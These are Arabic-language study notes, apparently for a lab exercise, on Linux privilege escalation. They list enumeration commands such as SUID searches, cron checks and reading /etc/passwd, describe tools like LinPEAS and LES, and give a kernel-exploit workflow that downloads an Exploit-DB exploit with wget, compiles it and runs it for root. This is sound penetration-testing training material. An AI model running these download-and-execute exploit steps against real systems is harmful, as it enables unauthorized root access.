# Linux Privilege Escalation

![image](https://github.com/user-attachments/assets/7d5663ba-af28-421d-823d-67a0c93c8b7f)

<details>
  <summary>Enumeration</summary>


```
Username: karen

Password: Password1
```

  

## 1. Basic Info (معلومات عامة عن النظام)

| أمر        | وظيفته                                                    |
| ---------- | --------------------------------------------------------- |
| `whoami`   | يعرفك اسم المستخدم اللي انت عليه حاليًا                   |
| `id`       | يوضح الـ UID/GID والصلاحيات المرتبطة بيك                  |
| `hostname` | اسم الجهاز – أحيانًا مفيد لو الجهاز له اسم يدل على وظيفته |
| `uname -a` | إصدار الكرنل + المعمارية (x86\_64 أو غيره)                |

![image](https://github.com/user-attachments/assets/6363ac11-bf41-4ae1-9b7d-b9c42e67e1fc)


---

## 2. OS Version & Kernel

| أمر                   | وظيفته                                                                        |
| --------------------- | ----------------------------------------------------------------------------- |
| `cat /etc/issue`      | يطبع اسم وتفاصيل الـ Linux distro (مثلاً Ubuntu 20.04)                        |
| `cat /etc/os-release` | ملف رسمي فيه اسم النسخة + ID + Version                                        |
| `cat /proc/version`   | معلومات عن الكرنل + إذا كان GCC موجود (مهم لو عايز تـ compile local exploits) |



---

## 3. Environment

| أمر          | وظيفته                                                                                            |
| ------------ | ------------------------------------------------------------------------------------------------- |
| `env`        | يطبع كل المتغيرات البيئية، ممكن تلاقي فيها tokens أو مسارات غريبة                                 |
| `echo $PATH` | بيعرفك المسارات اللي النظام بيشوف فيها الملفات القابلة للتنفيذ – مهم جدًا لو فيه مسار قابل للحقن! |


![image](https://github.com/user-attachments/assets/aab5ff77-0ab8-4a6a-b7c5-db330f0e8a2f)

---

## 4. Users and Groups

| أمر               | وظيفته                                                                 |
| ----------------- | ---------------------------------------------------------------------- |
| `cat /etc/passwd` | يطبع كل المستخدمين الموجودين على النظام                                |
| `cat /etc/group`  | يشوف المجموعات اللي موجودة واللي ممكن تكون حساسة (مثلاً: docker، sudo) |

![image](https://github.com/user-attachments/assets/7b0e7204-dc60-4b97-981c-040c90fd6ccf)

![image](https://github.com/user-attachments/assets/ed5096cb-2831-45c1-a506-52bf1271e7f2)


---


## 5. Crontab / Scheduled Jobs

| أمر                 | وظيفته                                                                    |
| ------------------- | ------------------------------------------------------------------------- |
| `crontab -l`        | المهام المجدولة للمستخدم الحالي                                           |
| `ls -la /etc/cron*` | يشوف كل ملفات الـ crontab في النظام – أحيانًا تلاقي سكريبت بيتنفذ بـ root |
| `cat /etc/crontab`  | المهام المجدولة للنظام ككل – ممكن تديك وسيلة للاستغلال                    |



---

## 6. Processes & Services

| أمر                             | وظيفته                                                                   |
| ------------------------------- | ------------------------------------------------------------------------ |
| `ps aux`                        | يعرض كل العمليات الجارية – ممكن تلاقي برنامج بيشغله root                 |
| `top` أو `htop`                 | مشاهدة تفاعلية للعمليات                                                  |
| `netstat -tulnp` أو `ss -tulnp` | الخدمات اللي شغالة على البورتات – ممكن تلاقي حاجة داخليًا بس (localhost) |


![image](https://github.com/user-attachments/assets/16f4a91d-8133-481a-b79a-eb75ecbcb0f5)


![image](https://github.com/user-attachments/assets/e919e12d-1c12-405b-81cc-2d4a55b83133)
![image](https://github.com/user-attachments/assets/ec996032-2bf8-411f-8b80-590ed7b4e971)

![image](https://github.com/user-attachments/assets/03193a5c-21cf-4abe-b00a-616bb3e026f8)

![image](https://github.com/user-attachments/assets/a8f6abd4-62c9-4fe1-a78d-942b6929c021)

---

## 7. File System Permissions

| أمر                                     | وظيفته                                                                   |
| --------------------------------------- | ------------------------------------------------------------------------ |
| `find / -perm -4000 2>/dev/null`        | يبحث عن ملفات SUID – ملفات بتشتغل بصلاحيات المالك، ممكن تديك root access |
| `find / -perm -u=s -type f 2>/dev/null` | بديل للبحث عن SUID executables                                           |
| `find / -writable -type d 2>/dev/null`  | مجلدات قابلة للكتابة – ممكن تعمل فيها استغلال                            |


![image](https://github.com/user-attachments/assets/5c13b75e-a6c9-4e51-aa7d-0702d534d47c)

![image](https://github.com/user-attachments/assets/fde332e2-f181-44c0-b326-8f0c9150e57a)

![image](https://github.com/user-attachments/assets/4a89aa31-9be3-4e87-85df-0d1ec5ad4710)



---







## ✅ ملخص سريع :

| المحور           | الهدف                                         |
| ---------------- | --------------------------------------------- |
| OS & Kernel Info | تشوف لو في ثغرات على النسخة دي                |
| Environment      | PATH وقيم مهمة ممكن تسبب استغلال              |
| Users & Groups   | هل انت في مجموعة حساسة؟                       |
| Cron Jobs        | هل في سكريبت بيشتغل بوقت محدد ممكن تعدله؟     |
| Processes        | هل في برامج بتشتغل بصلاحيات أعلى؟             |
| SUID Files       | ممكن تستغل ملف بـ SUID عشان تاخد صلاحيات أعلى |






---
---





![image](https://github.com/user-attachments/assets/b8d06c67-4553-4990-ad30-9034da8eaf34)






  
</details>


















<details>
  <summary>Automated Enumeration Tools</summary>

# 🔐 Linux Privilege Escalation Enumeration Tools

قائمة بأهم الأدوات المفتوحة المصدر التي تُستخدم لتجميع معلومات النظام (Enumeration) من أجل اكتشاف فرص للترقية إلى صلاحيات أعلى (Root).

---

## 🥇 1. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- 🔎 من أقوى الأدوات الآلية لتجميع كل شيء تقريبًا.
- تبحث عن:
  - صلاحيات خاطئة في الملفات
  - SUID/SGID binaries
  - ملفات cron
  - كلمات مرور مكشوفة
  - خدمات مشغلة بصلاحيات عالية
- 🧠 تحتوي على خوارزميات للكشف عن misconfigurations والفرص الواضحة للاستغلال.
- ✅ مناسبة للأنظمة الحديثة والمتنوعة.

---

## 🥈 2. [LinEnum](https://github.com/rebootuser/LinEnum)

- 📜 سكربت Bash تقليدي لكن شامل.
- يقوم بجمع معلومات مثل:
  - بيانات النظام والمستخدم
  - cron jobs
  - network config
  - ملفات SUID/SGID
- 💡 أقل تفاعلية من LinPEAS، لكنه خفيف وسهل التشغيل.
- مفيد في حالات محدودة الموارد.

---

## 🥉 3. [LES - Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

- 🔍 يحلل إصدار الكرنل ويقترح عليك Exploits معروفة.
- مش بيعمل Enumeration كامل، لكنه:
  - يقارن الكرنل الحالي بقاعدة بيانات فيها Exploits قديمة
  - يعطيك توصيات مباشرة
- مناسب بعد معرفة إصدار الكرنل من `uname -a`.

---

## 4. [Linux Smart Enumeration (LSE)](https://github.com/diego-treitos/linux-smart-enumeration)

- 🧠 أداة ذكية تعمل بـ 3 أوضاع:
  - Quick
  - Standard
  - Thorough
- تعرض النتائج بتنسيق واضح وسهل الفهم.
- مصممة لتكون "هادئة" – لا تترك أثر واضح في النظام.
- مفيدة للاختبارات الهادئة (Low OPSEC).

---

## 5. [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

- 📘 سكربت Python قديم نسبيًا لكنه مفيد.
- يعطيك ملخص لبيئة التشغيل، الصلاحيات، الملفات الغريبة.
- مناسب مع الأنظمة القديمة أو أنظمة Python-only.

---

## 🧰 ملاحظات عامة:

| أداة | نوعها | الأفضل لـ |
|------|--------|------------|
| LinPEAS | شامل + ذكي | اكتشاف فرص متعددة + تحليل شامل |
| LinEnum | بسيط + مباشر | بيئة محدودة أو سكربت سريع |
| LES | اقتراح Exploits فقط | بعد معرفة kernel |
| LSE | ذكي + منظم | الاختبارات الدقيقة بدون ضوضاء |
| LinuxPrivChecker | خفيف + Python | بيئات قديمة أو محدودة |

---

> 💡 **نصيحة:** الأفضل دائمًا تبدأ بـ LinPEAS أو LSE، وبعد كده تستخدم LES لو فيه فرصة لاستغلال الكرنل.


  
</details>

























<details>
  <summary>Privilege Escalation: Kernel Exploits</summary>


# 🚀 Linux Privilege Escalation – Kernel Exploits

## 🎯 الهدف
استغلال ثغرات في نواة النظام (Kernel) للترقية من مستخدم عادي إلى root.

---

## 🧾 1. تحديد إصدار الكرنل

```bash
uname -r
```

مثال إخراج:
```
3.13.0-24-generic
```

---

## 🔍 2. البحث عن ثغرات مناسبة

### أدوات مساعدة:
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Exploit-DB](https://www.exploit-db.com)
- `searchsploit` (لو مثبت عندك)

### مثال باستخدام LES:
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## 🛠️ 3. تجربة Exploit

### خطوات عامة:

1. تحميل الكود:
```bash
wget https://www.exploit-db.com/raw/37292 -O exploit.c
```

2. تجميع (Compile):
```bash
gcc exploit.c -o exploit
```

3. تشغيل:
```bash
./exploit
```

4. التحقق من الصلاحيات:
```bash
whoami
id
```

---

## ⚠️ ملاحظات مهمة

| نقطة | توضيح |
|------|--------|
| ❗ Compiler (مثل gcc) لازم يكون متاح | لو مش موجود، compile من جهازك وانقل الملف |
| ⚙️ بعض الثغرات مش بتشتغل دايمًا | جرب أكثر من exploit |
| 📛 Kernel Exploits خطيرة | ممكن تسبب system crash أو shell غير مستقرة |
| 🧠 استخدم Virtual Machine أو اختبار فقط | لتفادي تلف النظام |

---

## ✅ خطوات التلخيص

| الخطوة | الأداة |
|--------|--------|
| تحديد إصدار الكرنل | `uname -r` |
| اقتراح ثغرات | LES، Exploit-DB، searchsploit |
| تحميل واستغلال | `wget`, `gcc`, `./exploit` |
| التأكد من النجاح | `whoami`, `id` |

---

> 💡 **نصيحة:** دائمًا احتفظ بمجموعة Exploits جاهزة، واختبرها في بيئة آمنة فقط.





---
---



  
</details>

































